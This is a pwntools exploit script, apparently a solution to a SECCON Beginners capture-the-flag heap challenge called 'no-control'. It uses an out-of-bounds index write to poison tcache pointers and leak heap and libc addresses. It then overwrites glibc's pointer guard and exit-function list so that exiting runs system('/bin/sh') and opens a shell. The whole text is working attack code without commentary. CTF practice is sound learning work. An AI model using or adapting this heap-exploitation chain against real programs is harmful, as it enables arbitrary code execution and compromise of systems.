from pwn import *

e = context.binary = ELF('./chall', checksec=False)
libc = ELF('./libc.so.6')
context.terminal = 'bash'
if args.REMOTE:
    p = remote('no-control.beginners.seccon.games', 9005)
else:
    p = process('./chall', env={"LD_PRELOAD": "./libc.so.6"})

def dbg():
    gdb.attach(p)
    pause()

def create(idx):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'index: ', str(idx).encode())

def read(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'index: ', str(idx).encode())
    return p.recvline()[:-1]

def update(idx, content):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendlineafter(b'content: ', content)

def delete(idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'index: ', str(idx).encode())

def protect_ptr(x, y):
    # x -> y
    return (x >> 12) ^ y

ptr_guard = -0x2890
exit_funcs = 0x219838

# heap leak
create(0)
delete(0)
create(0)
heap = u64(read(0).ljust(8, b'\0')) << 12
heap += 0x2a0
log.info('heap: ' + hex(heap))

# libc leak
create(1)   # heap+0x90
create(2)   # heap+0x120
create(3)   # heap+0x1b0
create(4)   # heap+0x240

delete(0)
delete(1)
update(-1, p64(protect_ptr(heap+0x90, heap-0x290)))
create(0)   # heap+0x90
create(1)   # heap-0x290
delete(2)
delete(3)
update(-1, p64(protect_ptr(heap+0x1b0, heap+0x90)))
create(3)
create(2)   # heap+0x90
update(1, b'\xff'*0x10)
delete(0)   # heap+0x90 -> unsortedbin

libc.address = u64(read(2).ljust(8, b'\0')) - 0x219ce0
log.info('libc: ' + hex(libc.address))

# Overwrite __pointer_chk_guard
update(1, b'\0'*0x10)
delete(3)
delete(4)
update(-1, p64(protect_ptr(heap+0x240, libc.address+ptr_guard)))
create(3)
create(4)
update(4, b'\0'*0x10)

# Overwrite __exit_funcs
fn = libc.symbols['system']
fn = ((fn<<17)&((1<<64)-1)) | (fn>>(64-17))
update(1, b'\0'*0x10)
create(3)
create(4)
delete(3)
delete(4)   
update(-1, p64(protect_ptr(heap+0x2d0, libc.address+exit_funcs-0x8)))
create(3)
create(4)
update(3, p64(4)+p64(fn)+p64(next(libc.search(b'/bin/sh')))+p64(0))
update(4, p64(heap+0x80)*2)
p.sendlineafter(b'> ', b'5')
p.interactive()
